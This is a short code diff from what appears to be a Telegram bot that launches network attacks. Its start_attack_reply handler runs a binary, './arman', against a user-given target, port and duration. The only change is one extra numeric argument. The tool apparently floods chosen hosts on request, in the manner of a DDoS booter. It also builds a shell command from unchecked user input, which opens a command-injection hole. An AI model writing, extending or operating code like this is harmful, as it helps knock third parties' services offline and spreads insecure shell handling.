@@ -275,7 +275,7 @@ def start_attack_reply(message, target, port, time_duration):
     sent_message = bot.reply_to(message, response)
 
     # Start the attack command
-    full_command = f"./arman {target} {port} {time_duration} 200 200 200 arman"
+    full_command = f"./arman {target} {port} {time_duration} 200 200 200 200 arman"
     subprocess.Popen(full_command, shell=True)
 
     # Countdown logic
